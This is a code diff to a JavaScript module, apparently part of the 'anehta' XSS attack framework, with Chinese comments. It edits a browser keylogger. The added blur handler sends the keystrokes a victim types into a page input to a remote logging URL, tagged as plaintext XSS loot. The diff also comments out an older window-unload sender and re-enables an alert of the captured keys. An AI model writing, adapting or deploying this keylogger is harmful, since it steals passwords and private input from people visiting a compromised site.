@@ -28,13 +28,23 @@ $(tagName[0]).keydown(function(event){
 	               "', keyCode:'"+event.keyCode+
 	               "'}";  
 	keystrokes = keystrokes + String.fromCharCode(event.keyCode);                          
-	//alert(keystrokes);
+	alert(keystrokes);
 	i=i+1;
 	j=j+1
 });
 
+// input失去焦点时触发
+$(tagName[0]).blur(function(){
+	                   keylogger = NoCryptMark + XssInfo_S+"Keylogger: " + keylogger + XssInfo_E;
+	                   anehta.net.getURL(logurl+escape(keylogger));
+	                   anehta.core.freeze(200);
+	                 }
+);
+
+/*
 // 在窗口关闭时候发送keylog 到服务器
 // 不稳定,如果是提交表单到其他页面的话,会post出错
+// 如果unload事件已经被改写的话,会出问题
 $(window).unload(function(){
 	//alert(keylogger);
 	// 时间不允许再base64加密了
@@ -42,9 +52,10 @@ $(window).unload(function(){
 	// 明文传输,需要标记为NoCryptMark
 	keylogger = NoCryptMark + XssInfo_S+"Keylogger: " + keylogger + XssInfo_E;
 	//alert(keylogger);
+	//anehta.core.freeze(500);
 	anehta.net.getURL(logurl+escape(keylogger));
-	anehta.core.freeze(500);
+	anehta.core.freeze(900);
 	//alert(keylogger);	
 }
 );
-
+*/
